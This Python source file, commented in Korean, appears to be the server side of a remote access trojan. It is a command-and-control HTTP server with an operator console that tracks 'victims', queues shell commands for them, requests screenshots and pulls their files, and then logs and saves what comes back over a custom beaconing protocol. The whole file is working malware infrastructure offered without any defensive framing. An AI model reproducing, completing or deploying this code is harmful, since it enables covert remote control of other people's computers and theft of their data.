from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import deque
from datetime import datetime

from customProtocol import DDP
from logManager import Logger

import threading
import cmd
import os

class BaseShell(cmd.Cmd):
    '''base'''
    prompt = "> "

    def _print_log(self, count=100):
        with open(LOG_PATH + datetime.now().strftime('%Y%m%d.txt'), 'r') as fr:
            log_data = fr.readlines()

        start_index = (len(log_data) - count) if (len(log_data) - count) > 0 else 0

        log_data = log_data[start_index:]

        for data in log_data:
            print(data, end='')

    def do_exit(self, arg):
        return True

    def do_log(self, arg):
        '''print log file\nusage log\nusage log [count]'''
        if arg:
            try:
                arg = int(arg)
                self._print_log(arg)
                return
            except:
                return self.default('log ' + arg)
        self._print_log()

# 시작 쉘
class EntryShell(BaseShell):
    '''Entry Shell'''

    def _get_victim_names(self) -> list:
        result = []

        for val in victim_table.values():
            result.append(val['name'])
        return result
    
    def _convert_victim_name_to_ip(self, vic_name) -> str:
        for ip, value in victim_table.items():
            if value['name'] == vic_name:
                return ip
        return False


    def do_use(self, arg):
        '''지정한 Victim의 쉘 모드로 진입'''

        if arg and arg in self._get_victim_names():
            victim_shell = VictimShell()
            victim_shell.setTarget(arg, self._convert_victim_name_to_ip(arg))
            victim_shell.cmdloop()

    def do_show(self, arg):
        '''show victim'''
        if arg == 'victim':
            print('|%20s|%20s|%40s|' % ('name', 'ip', 'cmd queue'))
            print('-'*84)
            for ip in victim_table.keys():
                print('|%20s|%20s|%40s|' % (victim_table[ip]['name'], ip, list(victim_table[ip]['command'])))

# 피해자 모드 쉘
class VictimShell(BaseShell):

    def setTarget(self, victimName, victimIP):
        self.prompt = '{0}({1}) > '.format(victimName, victimIP)
        self.targetIP = victimIP

    def do_sh(self, arg):
        '''sh [command]'''
        global victim_table
        victim_table[self.targetIP]['command'].append(arg)

    def do_screenshot(self, arg):
        '''take screenshot on victim and get it to server'''
        global victim_table
        victim_table[self.targetIP]['command'].append('[screenshot]')

    def do_show(self, arg):
        '''show (dict|queue)'''
        if arg == 'dict':
            print(victim_table[self.targetIP])
        elif arg == 'queue':
            print(list(victim_table[self.targetIP]['command']))
        pass

    def do_gf(self, arg):
        '''get victim's file\nusage : gf [file path & name] or gf [victim file path & name] [save name]'''
        global victim_table
        
        parsed_arg = arg.split(' ')
        if len(parsed_arg) == 1:
            if os.path.isfile(FILE_PATH + parsed_arg[0]):
                print('{} is already exit in FILE_PATH'.format(parsed_arg[0]))
                return
        elif len(parsed_arg) == 2:
            if os.path.isfile(FILE_PATH + parsed_arg[1]):
                print('{} is already exit in FILE_PATH'.format(parsed_arg[1]))
                return
        else:
            return self.default('gf ' + arg)


        # victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
        


    def do_sf(self, arg):
        '''미구현'''
        # TODO server to victim 파일 전송 구현하기
        pass

    

class CNCServer(BaseHTTPRequestHandler):
    # HTTPServer 모듈이 제공하는 로깅 기능 비활성화
    def log_message(self, format, *args):
        return

    # 파싱된 데이터 로깅
    def _logging_parsed_data(self, victim_ip, parsed_data):
        Logger.info("{} : {}".format(victim_ip, str(parsed_data)))
        '''try:
            for header, value in parsed_data.items():
                if header == 'data':
                    value = value.decode(ENCODING)
                Logger.info('{0} : {1}'.format(header, value))
        except UnicodeDecodeError as e:
            Logger.error('not utf-8 data')'''

    # 큐에 쌓인 명령어 pop
    def _pop_command_queue(self, victim_ip) -> str:
        global victim_table

        command = ""

        command_queue = victim_table[victim_ip]['command']
        
        while command_queue:
            if command_queue[0].startswith('[') and command_queue[0].endswith(']'):
                if command == "":
                    return command_queue.popleft()
                else:
                    break
            command += command_queue.popleft() + ";"
        
        return command[:-1]

    # ddp raw data 파싱
    def _parse_ddp(self, data) -> dict:
        try:
            return DDP.parsing(data)
        except Exception as e:
            self._response_ddp_error()
            Logger.error("request ddp parse error : {}".format(str(e)))
            return False

    # error 응답      
    def _response_ddp_error(self, error_message=""):
        self._response_writer(DDP.raw('ERROR', 0, error_message.encode(ENCODING)))

    # ack 응답
    def _response_ack(self):
        self._response_writer(DDP.raw('ACK', 0, ''.encode(ENCODING)))

    # shell request 응답
    def _response_shell_request(self, command):
        self._response_writer(DDP.raw('SHELL_REQUEST', 0, command.encode(ENCODING)))

    # ftp request 응답
    def _response_ftp_request(self, data, victim_ip, file_name):
        global victim_table

        victim_table[victim_ip]['fileName'].append(file_name)

        self._response_writer(DDP.raw('FTP_REQUEST', 0, data.encode(ENCODING)))

    # 응답 처리 및 응답 메시지 로깅
    def _response_writer(self, data : bytes, additional_header={}):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset={}'.format(ENCODING))

        if len(additional_header) > 0:
            for key, val in additional_header.items():
                self.send_header(key, val)
        self.end_headers()

        self.wfile.write(data)

        try:
            Logger.info('response ' + str(data))
        except:
            Logger.info('response unknown data')

    # vimctim 추가
    def _append_victim(self, victim_ip, victim_name=""):
        global victim_table

        if not victim_name:
            victim_name = victim_ip

        victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'sequence' : {}, 'fileName' : deque()}

    # sequence 딕셔너리에 데이터 저장
    def _gather_seq_data(self, victim_ip, seq, data):
        global victim_table
        victim_table[victim_ip]['sequence'][seq] = data
        Logger.info('{} seq datas in'.format(seq))
    
    # sequence 딕셔너리에 쌓인 데이터 조립
    def _merge_seq_data(self, victim_ip) -> bytes:
        global victim_table

        sorted_key = sorted(victim_table[victim_ip]['sequence'].keys())

        merged_data = b''

        next_seq = 1

        for key in sorted_key:
            if key == 0:
                continue

            if next_seq != key:
                Logger.error('{} seq merge error : {}'.format(victim_ip, victim_table[victim_ip]['sequence']))
                victim_table[victim_ip]['sequence'] = {}
                return b'SEQ_ERROR'
        
            merged_data += victim_table[victim_ip]['sequence'][key]
            next_seq += key

        merged_data += victim_table[victim_ip]['sequence'][0]

        victim_table[victim_ip]['sequence'] = {}

        return merged_data

    def do_POST(self):
        # body와 ip get
        data_string = self.rfile.read(int(self.headers['Content-Length']))
        victim_ip = self.client_address[0]

        if len(data_string) < 10:
            self._response_ddp_error('invalid ddp data')
            return

        # body 파싱 후 로깅
        parsed_data = self._parse_ddp(data_string)

        # data 유효성 검증
        if not parsed_data or parsed_data['header'] != '0xdd':
            self._response_ddp_error('invalid ddp data')
            return

        # ftp 응답의 경우 로깅 X
        if parsed_data['type'] != 'FTP_RESPONSE':
            self._logging_parsed_data(victim_ip, parsed_data)
        

        # victim_table에 ip가 존재하지 않다면 추가 작업
        if victim_ip not in victim_table:
            self._append_victim(victim_ip=victim_ip)

        ddp_data = parsed_data['data']

        # sequence가 0이 아니라면 sequence 딕셔너리에 데이터 모으기
        if parsed_data['sequence'] != 0:
            self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data)
            self._response_ack()
            return

        # sequence가 0이면서 sequence 딕셔너리에 값이 존재한다면 data merge 수행
        if len(victim_table[victim_ip]['sequence']) > 0:
            self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data)
            ddp_data = self._merge_seq_data(victim_ip)

            # 잘못된 seq 발생시
            if ddp_data == b'SEQ_ERROR':
                self._response_ddp_error('seq merge error')

                # 만약 파일 데이터를 받는 중 발생한 seq 에러라면 큐에서 파일명 제거
                if parsed_data['type'] == 'FTP_RESPONSE' and victim_table[victim_ip]['fileName']:
                    victim_table[victim_ip]['fileName'].popleft()
                return

        # type별 함수 호출
        type_function = getattr(self, "_func_"+parsed_data['type'].lower())
        type_function(victim_ip, ddp_data)

    # 비콘 요청에 대한 처리 함수
    def _func_beacon_request(self, victim_ip : str, ddp_data):
        # 큐에 쌓인 명령어 pop
        data = self._pop_command_queue(victim_ip)   

        if data:
            if data.startswith('[') and data.endswith(']'):
                # screenshot 명령어 처리
                if data == "[screenshot]":
                    self._response_ftp_request("screenshot", victim_ip, datetime.now().strftime('%Y%m%d-%H%M%S.bmp'))
                    return
                # gf 명령어 처리
                elif data.startswith('[gf'):
                    file_name = data.split(' ')
                    file_name = file_name[len(file_name)-1][:-1]

                    self._response_ftp_request(file_name, victim_ip, file_name)
                    return
            # shell 명령어 처리
            else:
                self._response_shell_request(data)
                return
        # 명령어가 존재하지 않으면 ack response
        else:
            self._response_ack()

    # shell 응답에 대한 처리 함수
    def _func_shell_response(self, victim_ip : str, ddp_data):
        Logger.info('sh result : {}'.format(ddp_data.decode(ENCODING)))
        self._response_ack()

    # ftp 응답에 대한 처리 함수
    def _func_ftp_response(self, victim_ip : str, ddp_data):
        # TODO file_path에 맞게 저장
        fileName = ""

        try:
            fileName = victim_table[victim_ip]['fileName'].popleft()

            #만약 파일명이 fullpath이면 \ 를 제거
            if '\\' in fileName:
                fileName = fileName.split('\\')[-1]

            with open(FILE_PATH+fileName, 'wb') as fw:
                fw.write(ddp_data)
            
            Logger.info('{} file saved'.format(fileName))
            self._response_ack()
        except Exception as e:
            self._response_ddp_error('ftp response error')
            if not fileName:
                Logger.error('{0} fileName Queue is empty!'.format(victim_ip))
                return
            Logger.error('{0} save error : {1}'.format(fileName, str(e)))
        
LOG_PATH = Logger.LOG_PATH
FILE_PATH = './file/'

ENCODING = 'cp949'
SERVER_INFO = ('127.0.0.1', 80)

victim_table = {} # {ip : {name : [name], command : [command queue], sequence : {seq num, seq data}, fileName : [fileName queue]}}


# http server
try:
    httpd = HTTPServer(SERVER_INFO, CNCServer)

    http_server_thread = threading.Thread(target=httpd.serve_forever)
    http_server_thread.daemon = True
    http_server_thread.start()  
except Exception as e:
    print('[!] HTTP Server Open Error / {}'.format(str(e)))
    exit(0)


if __name__ == '__main__':
    try:
        EntryShell().cmdloop() # 대화형 쉘 실행
    except KeyboardInterrupt:
        print()
        exit(0)
